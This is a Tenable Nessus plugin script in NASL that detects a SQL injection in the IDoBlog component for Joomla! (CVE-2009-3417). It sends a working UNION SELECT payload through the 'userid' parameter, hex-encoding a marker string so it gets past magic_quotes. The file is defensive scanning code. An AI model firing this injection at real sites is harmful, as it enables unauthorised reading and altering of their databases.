#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(41645);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_cve_id("CVE-2009-3417");
  script_bugtraq_id(80456);
  script_osvdb_id(57013);
  script_xref(name:"EDB-ID", value:"9413");
  script_xref(name:"Secunia", value:"36243");

  script_name(english:"IDoBlog Component for Joomla! 'userid' Parameter SQLi");
  script_summary(english:"Attempts to manipulate friend additions.");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute( attribute:"description", value:
"The version of the IDoBlog component for Joomla! running on the remote
host is affected by a SQL injection vulnerability due to improper
sanitization of user-supplied input to the 'userid' parameter in a GET
request (when 'task' is set to 'profile') before using it to construct
database queries. An unauthenticated, remote attacker can exploit this
issue to manipulate database queries, resulting in disclosure of
sensitive information, modification of data, or other attacks against
the underlying database.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/09/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "IDoBlog";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('/com_idoblog/', 'function animFade');
  checks["/components/com_idoblog/assets/js/comment.js"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

url = "/index.php?option=com_idoblog";

res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

if (
  "option=com_idoblog&amp;task=userblog&amp;userid=" >< res[2] ||
  "component/idoblog/userblog/" >< res[2]
)
{
  # Identify a user's blog.
  userid = NULL;

  pat = "(option=com_idoblog&amp;task=userblog&amp;userid=|component/idoblog/userblog/)([0-9]+)";
  matches = egrep(pattern:pat, string:res[2]);
  if (matches)
  {
    foreach match (split(matches, keep:FALSE))
    {
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        userid = item[2];
        break;
      }
    }
  }
  if (isnull(userid)) exit(0, "Can't find a user with a blog.");

  magic = SCRIPT_NAME - ".nasl";

  exploit = userid + " UNION SELECT 1," + hexify(str:magic) + ",3,4,5,6,7,8,9,10,11,12,13,14,15,16 -- ";

  url = url + "&task=profile&Itemid=1337&userid=" + str_replace(find:" ", replace:"%20", string:exploit);

  res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

  # There's a problem if we can influence the additions to "our" list of friends.
  if (
    '<b>Was added to friends:</b>' >< res[2] &&
    ' class="bold4">' +magic+ '</a>' >< res[2]
  )
  {
    output = strstr(res[2], magic);
    if (empty_or_null(output)) output = res[2];

    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      sqli        : TRUE,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : chomp(output)
    );
    exit(0);
  }
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
